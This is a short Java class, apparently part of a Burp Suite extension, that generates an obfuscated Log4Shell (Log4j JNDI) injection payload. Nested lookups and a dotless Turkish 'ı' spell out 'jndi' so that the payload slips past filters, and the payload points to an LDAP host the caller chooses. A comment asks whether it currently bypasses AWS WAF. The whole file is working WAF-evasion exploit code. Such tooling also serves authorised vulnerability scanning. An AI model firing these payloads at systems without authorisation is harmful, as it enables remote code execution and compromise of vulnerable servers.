package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

//Currently bypass AWS waf?    12/23

public class POC17 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }

    @Override
    public int getIndex() {
        return 17;
    }
}
